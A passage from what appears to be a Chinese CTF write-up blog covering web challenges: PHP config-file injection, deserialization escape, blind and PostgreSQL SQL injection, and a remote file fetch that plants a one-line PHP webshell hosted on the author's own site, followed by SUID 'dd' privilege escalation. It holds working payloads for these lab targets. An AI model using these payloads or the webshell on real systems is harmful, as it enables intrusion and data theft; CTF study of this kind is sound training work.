addslashes($_GET[&#x27;option&#x27;]);</span><br><span class="line"></span><br><span class="line">if($str != NULL)&#123;</span><br><span class="line">    echo &#x27;:Where is the source code of config.php?&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file=file_get_contents(&#x27;./geek2.php&#x27;);</span><br><span class="line">$file=preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;,&quot;\$option=&#x27;$str&#x27;;&quot;,$file);</span><br><span class="line">file_put_contents(&#x27;./geek2.php&#x27;,$file);</span><br><span class="line">#config.php</span><br><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;chinfo&#x27;;</span><br></pre></td></tr></table></figure><p>p师傅的小密圈的一个问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = file_get_contents(<span class="string">&#x27;xxxxx/option.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&#x27;xxxxx/option.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>这个场景十分经典，常用在修改配置文件写入，但是又需要做一定的防御。</p><p>法一(利用正则的.*、单引号)：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/love.lemon:82/test</span><span class="regexp">/test.php?option=aaa&#x27;;%0aphpinfo();/</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/love.lemon:82/test</span><span class="regexp">/test.php?option=a</span></span><br></pre></td></tr></table></figure><p>这个其实是利用了正则的匹配问题，因为仔细研究一下，可以看到正则匹配的是</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;任意内容&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果输入<code>aaaaa&#39;;xxxxx</code>经过<code>addslashes</code>的单引号处理，成为<code>\&#39;</code></p><p>最后也就是<code>$option=&#39;aaaaa\&#39;;xxxxx&#39;;</code></p><p>正则匹配的会是啥?＝。＝，其实最后还是能全部匹配到的，也就是<code>aaaaa\&#39;;xxxxx&#39;;</code><br>当然最后通过注入了换行符突破，当然还需要再访问一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://love.lemon:82/<span class="built_in">test</span>/test.php?option=a</span><br></pre></td></tr></table></figure><p>通过正则将<code>\</code>替换掉</p><p>法二(利用preg_replace的转义)：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/love.lemon:82/test</span><span class="regexp">/test.php?option=aaa\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure><p><img src="804631-20170224220708335-357648033.png" alt="804631-20170224220708335-357648033.png"></p><p>其中红色的框框中是经过<code>preg_replace</code>替换后的<code>$file</code></p><p>可以看到与一开始经过<code>addslashes</code>函数处理后的<code>aa\\\&#39;</code>三个<code>\</code>变成了两个<code>\</code><br>猜测应该是<code>preg_replace</code>还是做了转义的处理，导致如此的一个变化，所以最后写入文件的也就是<code>$option=&#39;aaa\\&#39;;phpinfo()//&#39;;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这里利用%00</span><br><span class="line">仍然分为两步。</span><br><span class="line">第一次传入;phpinfo();</span><br><span class="line">此时文件内容为：</span><br><span class="line">$option=&#x27;;phpinfo();&#x27;;</span><br><span class="line">第二次传入%00</span><br><span class="line">%00被addslashes()转为\0，而\0在preg_replace函数中会被替换为“匹配到的全部内容”，此时preg_replace要执行的代码如下</span><br><span class="line">preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;,&quot;\$option=&#x27;\0&#x27;;&quot;,$file);</span><br><span class="line">也就是</span><br><span class="line">preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;,&quot;\$option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;;&quot;,$file);</span><br><span class="line">成功引入单引号闭合，最终写入shell</span><br><span class="line">$option=&#x27;\$option=&#x27;;phpinfo();&#x27;;&#x27;;</span><br></pre></td></tr></table></figure><p>flag在根目录 傻逼</p><blockquote><p><a href="https://blog.csdn.net/weixin_29504571/article/details/116286441">https://blog.csdn.net/weixin_29504571/article/details/116286441</a></p><p><a href="https://blog.csdn.net/dengzhasong7076/article/details/102139756">https://blog.csdn.net/dengzhasong7076/article/details/102139756</a></p></blockquote><p>加的if可能是提示吧 但是找到原题就不多说了</p><p>、</p><h1 id="loginintomyheart"><a href="#loginintomyheart" class="headerlink" title="loginintomyheart"></a>loginintomyheart</h1><p>登陆 错误 </p><p>error.php</p><p>告诉info.php</p><p>发现每次登陆都有 生成序列化 的登陆信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Log&quot;:3:&#123;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:7:&quot;islogin&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>使用admin发现被换成了hacker</p><p>直接逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:7:&quot;islogin&quot;;i:0;&#125;   21个</span><br><span class="line"></span><br><span class="line">21*5=105</span><br><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:7:&quot;islogin&quot;;i:1;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:3:&quot;Log&quot;:3:&#123;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:8:&quot;username&quot;;s:126:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:7:&quot;islogin&quot;;i:0;&#125;&quot;;s:7:&quot;islogin&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><p>查询语句</p><p><code>$sql=&quot;SELECT secretpass FROM vanzy_secret WHERE username=&#39;vanzy&#39; and secretpass=&#39;$secretpass&#39;;&quot;;</code></p><p>waf</p><p><img src="image-20221121150523910.png" alt="image-20221121150523910"></p><p><img src="image-20221121150450076.png" alt="image-20221121150450076"></p><p>时间盲注</p><p><code>-1&#39;/**/or/**/sleep(5)%23</code></p><p>延时成功</p><p><code>-1&#39;/**/or/**/if(ascii(mid(user(),4,1))/**/like/**/116,sleep(5),1)%23</code></p><p>得到当前用户root</p><p>数据库名不知道 但是知道表名 <code> vanzy_secret</code> 还有 列<code>secretpass</code>  <code>username</code></p><p><code>-1&#39;/**/or/**/if(ascii(mid((select/**/secretpass/**/from/**/vanzy_secret/**/limit 0,1),1,1))/**/like/**/68,sleep(5),1)%23</code></p><p>得到  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=登录&amp;secretpass=&#x27;or/**/if((ascii(mid((select/**/secretpass/**/from/**/vanzy_secret/**/where/**/username/**/like/**/&#x27;vanzy&#x27;/**/limit/**/0,1),1,1))like/**/&#123;&#123;int(48-126)&#125;&#125;),sleep(1),0)%23&amp;username=vanzy</span><br></pre></td></tr></table></figure><p>van2y0secret0qaq</p><p>登陆</p><p><img src="image-20221125183303959.png" alt="image-20221125183303959"></p><h1 id="rceus-不会"><a href="#rceus-不会" class="headerlink" title="rceus(不会)"></a>rceus(不会)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nonono&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$code = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(&#x27;syclover&#x27; === preg_replace(&#x27;/;+/&#x27;,&#x27;syclover&#x27;,preg_replace(&#x27;/[A-Za-z_]+\(+|\)/&#x27;,&#x27;&#x27;,$code)))&#123;</span><br><span class="line">    eval($code.&#x27;syclover!&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;nonono&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="noobsql（不会）"><a href="#noobsql（不会）" class="headerlink" title="noobsql（不会）"></a>noobsql（不会）</h1><h1 id="edit-php"><a href="#edit-php" class="headerlink" title="edit_php"></a>edit_php</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">no resource!</span><br><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/catchImg.php:30) in /var/www/html/catchImg.php on line 31</span><br><span class="line">&lt;?php</span><br><span class="line">if(!isset($_COOKIE[&#x27;path&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /index.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $path = $_COOKIE[&#x27;path&#x27;];</span><br><span class="line">    if(!is_dir(&#x27;upload/&#x27;.$path))&#123;</span><br><span class="line">        mkdir(&#x27;upload/&#x27;.$path);</span><br><span class="line">        chmod(&#x27;upload/&#x27;.$path,0755);</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $uri = parse_url($str, 5);</span><br><span class="line">        $checklist = [&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;];</span><br><span class="line">        $ext = substr($uri,strpos($uri,&quot;.&quot;)+1);</span><br><span class="line">        if(in_array($ext,$checklist))&#123;</span><br><span class="line">            return $uri;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;file_url&#x27;]))&#123;</span><br><span class="line">            $contents = file_get_contents($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            $ext = substr($_GET[&#x27;file_url&#x27;], strrpos($_GET[&#x27;file_url&#x27;], &quot;.&quot;) + 1);</span><br><span class="line">            $uri = waf($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            if($uri !== &quot;&quot;)&#123;</span><br><span class="line">                $file_name = substr($uri,&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1,strpos($uri,&#x27;.&#x27;)-(&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1));</span><br><span class="line">                file_put_contents(&#x27;upload/&#x27;.$path.&#x27;/&#x27;.md5($file_name).&#x27;.&#x27;.$ext,$contents);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;no resource!&quot;;</span><br><span class="line">        header(&quot;Location: /index.php&quot;);</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;refresh: 0;url=/showImage.php&quot;);</span><br><span class="line">echo &quot;success&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>出题人: <code>R1gelX</code></p><p><img src="image-20221125182653451.png" alt="image-20221125182653451"></p><p>打开网页</p><p>根据页面操作下去没啥东西</p><p>最后就一个图片一直在转</p><p><img src="image-20221125182714744.png" alt="image-20221125182714744"></p><p>用yakit抓包发现了信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/catchImg.php?file_url=example.jpg</span><br></pre></td></tr></table></figure><p>访问一下 <code>catchImg.php</code></p><p><img src="image-20221125182728037.png" alt="image-20221125182728037"></p><p>出现了php源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_COOKIE[&#x27;path&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /index.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $path = $_COOKIE[&#x27;path&#x27;];</span><br><span class="line">    if(!is_dir(&#x27;upload/&#x27;.$path))&#123;</span><br><span class="line">        mkdir(&#x27;upload/&#x27;.$path);</span><br><span class="line">        chmod(&#x27;upload/&#x27;.$path,0755);</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $uri = parse_url($str, 5);</span><br><span class="line">        $checklist = [&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;];</span><br><span class="line">        $ext = substr($uri,strpos($uri,&quot;.&quot;)+1);</span><br><span class="line">        if(in_array($ext,$checklist))&#123;</span><br><span class="line">            return $uri;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(isset($_GET[&#x27;file_url&#x27;]))&#123;</span><br><span class="line">            $contents = file_get_contents($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            $ext = substr($_GET[&#x27;file_url&#x27;], strrpos($_GET[&#x27;file_url&#x27;], &quot;.&quot;) + 1);</span><br><span class="line">            $uri = waf($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">            if($uri !== &quot;&quot;)&#123;</span><br><span class="line">                $file_name = substr($uri,&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1,strpos($uri,&#x27;.&#x27;)-(&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1));</span><br><span class="line">                file_put_contents(&#x27;upload/&#x27;.$path.&#x27;/&#x27;.md5($file_name).&#x27;.&#x27;.$ext,$contents);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;no resource!&quot;;</span><br><span class="line">        header(&quot;Location: /index.php&quot;);</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;refresh: 0;url=/showImage.php&quot;);</span><br><span class="line">echo &quot;success&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计一下代码</p><p>需要传参两个值</p><p>get传参<code>file_url</code></p><p>Cookie传参<code>path</code></p><p>把这个代码分成三部分来分析</p><p>一: 变量 contents ext uri</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$contents = file_get_contents($_GET[&#x27;file_url&#x27;]);</span><br><span class="line">$ext = substr($_GET[&#x27;file_url&#x27;], strrpos($_GET[&#x27;file_url&#x27;], &quot;.&quot;) + 1);</span><br><span class="line">$uri = waf($_GET[&#x27;file_url&#x27;]);</span><br></pre></td></tr></table></figure><p>二: 函数 file_put_contents()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = substr($uri,&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1,strpos($uri,&#x27;.&#x27;)-(&#x27;&#x27;==strpos($uri,&#x27;/&#x27;)?0:1));</span><br><span class="line">file_put_contents(&#x27;upload/&#x27;.$path.&#x27;/&#x27;.md5($file_name).&#x27;.&#x27;.$ext,$contents);</span><br></pre></td></tr></table></figure><p>三: 方法 waf($str)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uri = parse_url($str, 5);</span><br><span class="line">$checklist = [&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;];</span><br><span class="line">$ext = substr($uri,strpos($uri,&quot;.&quot;)+1);</span><br><span class="line">if(in_array($ext,$checklist))&#123;</span><br><span class="line">    return $uri;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;&quot;;</span><br></pre></td></tr></table></figure><p>首先从第二部分开始分析 也就是最终的文件写入函数</p><p>文件名是由 <code>upload/&#39;.$path.&#39;/&#39;.md5($file_name).&#39;.&#39;.$ext</code> 构成</p><p>能控制的地方是 <code>path</code> 但是好像没啥用</p><p>前面一部分是文件名 <code>upload/&#39;.$path.&#39;/&#39;.md5($file_name)</code></p><p>后面一部分是文件后缀名 <code>$ext</code></p><p>而且要想执行这函数需要满足 <code>$uri !== &quot;&quot;</code></p><p>这时候回去看第一部分</p><p>contents直接由get传参来</p><p>ext由substr和strrpos取的后缀名</p><p>uri是方法waf的返回值</p><p>这三个变量都只跟get传参 <code>file_url</code> 有关</p><p>继续看第三部分方法waf()</p><p>uri是parse_url的返回值</p><p>这里的parse_url需要一个http地址 对传参挺限制的</p><p>然后有白名单checklist</p><p>ext为取的后缀名 但是这里的取后缀方式与前面不同</p><p>然后是判断是否在白名单</p><p>否则就返回 <code>&quot;&quot;</code> 进入不了最终的函数</p><p>整理一下整个思路</p><p>关键是第一部分的三个变量</p><p>文件名不重要 主要是后缀名要是.php</p><p>而且parse_url限制了要http地址</p><p>?不一定是限制</p><p>我是否可以把这个地址弄成我的博客网站</p><p>我只需要在根目录下放一个马子</p><p>然后就能利用file_get_contents读取到我写的马子的内容?</p><p>先在网站根目录上传了一个shell.png</p><p>里面有一句话木马 <code>&lt;?php @eval($_POST[&#39;o2takuXX&#39;]);?&gt;</code></p><p>然后在本地调试一会儿</p><p>构造出了这样的payload:</p><p>get:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_url=https://www.o2takuxx.com/shell.png?.php</span><br></pre></td></tr></table></figure><p>Cookie:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path=shell</span><br></pre></td></tr></table></figure><p>首先在本地这样是能读取到shell.png这个文件的</p><p><img src="image-20221125182840324.png" alt="image-20221125182840324"></p><p>而ext成了php</p><p>!<img src="image-20221125182853796.png" alt="image-20221125182853796"></p><p>这里的uri是shell.png成功绕过</p><p>因为在我测试的时候发现</p><p>parse_url传参的http地址中有<code>?</code>时</p><p>后面的内容就会被截断</p><p>难道是因为当成get请求了吗?</p><p>最后在本地试一下打通payload</p><p><img src="image-20221125182906486.png" alt="image-20221125182906486"></p><p>本地成功写入了文件</p><p>并且还知道文件名 <code>f07e0bd39201d8bb9a76c8d8dd7030a7.php</code></p><p>直接去实战</p><p>打通payload然后用蚁剑连接成功</p><p><img src="image-20221125182921046.png" alt="image-20221125182921046"></p><p>但是在根目录下读取不出flag内容</p><p>应该是权限不够 接下来就是<code>提权</code></p><p>在虚拟终端里面操作</p><p>输入命令 <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="image-20221125182938259.png" alt="image-20221125182938259"></p><p>发现这里有 <code>dd</code> 命令</p><p>直接用 <code>dd if=/f1ag_is_here_y0u_k0nw</code> 读取flag</p><p><img src="image-20221125182949594.png" alt="image-20221125182949594"></p><p>拿到flag <code>SYC&#123;d0_U_k0nw_ueditor?&#125;</code></p><h1 id="cointowin（不会）"><a href="#cointowin（不会）" class="headerlink" title="cointowin（不会）"></a>cointowin（不会）</h1><h1 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h1><p>打开容器</p><p><img src="image-20221125183129974.png" alt="image-20221125183129974"></p><p>sql注入 post传参g</p><p>简单判断为有回显且为数字型</p><p>但是这题测试了一下</p><p>总感觉很怪 说不出来</p><p>ban了一些符号 <code>&#39; &quot; ;</code></p><p>尝试传参 <code>g=1 or 1=1 --+</code></p><p><img src="image-20221125183142129.png" alt="image-20221125183142129"></p><p>直接用万能密码爆出了VanZY的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;Fake_FLag_Real_IN_ffllaag_schema&#125;</span><br></pre></td></tr></table></figure><p>假的提示性flag</p><p>应该是想表示真的flag在另一个schema里面</p><p>但是我还是无法控制回显</p><p>很怪 最后直接摆烂上 <code>sqlmap</code></p><p>当然没有一把梭出来</p><p>但是知道了一个重要的信息</p><p>这不是基于平时最常见的 <code>MySQL</code> 的注入</p><p>而是 <code>PostgreSQL</code></p><p>知道了这个就好说了</p><p>去了解学习了一下相关内容</p><p>发现跟平时的MySQL的sql注入有很大区别的</p><p>这也就是让我感觉很怪的地方</p><p>传参 <code>g=1 union select null,chr(120),version()--</code></p><p>得到了版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL 14.5 (Ubuntu 14.5-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, 64-bit</span><br></pre></td></tr></table></figure><p><img src="image-20221125183156038.png" alt="image-20221125183156038"></p><p>过滤了 <code>&#39;</code> 有很多方法绕过</p><p>比如用 <code>chr(120)||chr(120)</code> 来拼接</p><p>或者直接用 <code>$$xx$$</code> 来代替</p><p>那就直接上流程</p><p>一: 爆库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 union select null,chr(120),(current_database())--</span><br></pre></td></tr></table></figure><p>库名为 <code>ctf</code></p><p>二: 爆schemaname</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 union select null,chr(120),(schemaname) FROM pg_tables--</span><br></pre></td></tr></table></figure><p>有 <code>pg_catalog ffllaag users information_schema</code></p><p>三: 爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 union select null,chr(120),(tablename) FROM pg_tables WHERE schemaname IN ($$ffllaag$$)--</span><br></pre></td></tr></table></figure><p>表名为 <code>user</code></p><p>四: 爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 UNION SELECT NULL,attname,NULL FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum&gt;0 AND a.relname=($$user$$) AND nspname=($$ffllaag$$)--</span><br></pre></td></tr></table></figure><p>字段有 <code>uname id passwd</code></p><p>五: 爆数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 UNION ALL SELECT NULL,uname||chr(45)||id||chr(45)||passwd,NULL FROM ffllaag.user--</span><br></pre></td></tr></table></figure><p>得到admin的密码 <code>SYC&#123;S@rry_Realflag_In_root_directory&#125;</code></p><p><img src="image-20221125183208593.png" alt="image-20221125183208593"></p><p>这也是一个假的提示性flag</p><p>看样子真的flag在根目录下</p><p>这下就需要两个相关函数操作了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ls_dir()` 和 `pg_read_file()</span><br></pre></td></tr></table></figure><p>首先用pg_ls_dir得知flag的文件名</p><p>然后用pg_read_file读取flag内容</p><p>但是在读取文件名的时候出现了一些问题</p><p>根目录下文件有很多</p><p>这里的回显位并不能完全显示</p><p>于是构造了这样的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 union select null,pg_ls_dir($$/$$),* from pg_ls_dir($$/$$)--</span><br></pre></td></tr></table></figure><p><img src="image-20221125183216468.png" alt="image-20221125183216468"></p><p>这样就巧妙地知道了文件名 <code>aflag</code></p><p>然后就是读取了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=1 union select null,pg_read_file($$/aflag$$),chr(120)--</span><br></pre></td></tr></table></figure><p><img src="image-20221125183223609.png" alt="image-20221125183223609"></p><p>拿到真正的flag <code>SYC&#123;1s_re@L_eaEASYsy_SQ&amp;&amp;L&#125;</code></p><p>比赛总结：</p><p>别人家的dlnufcg 菜鸡选手做的津津有味 其实自己拉爆了 xxe没测出来  盲注写对payload ascii转错字符 真该死啊</p><p>以后这种简单题做不出的话就紫砂吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysqludf提权</title>
      <link href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/"/>
      <url>/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/</url>
      
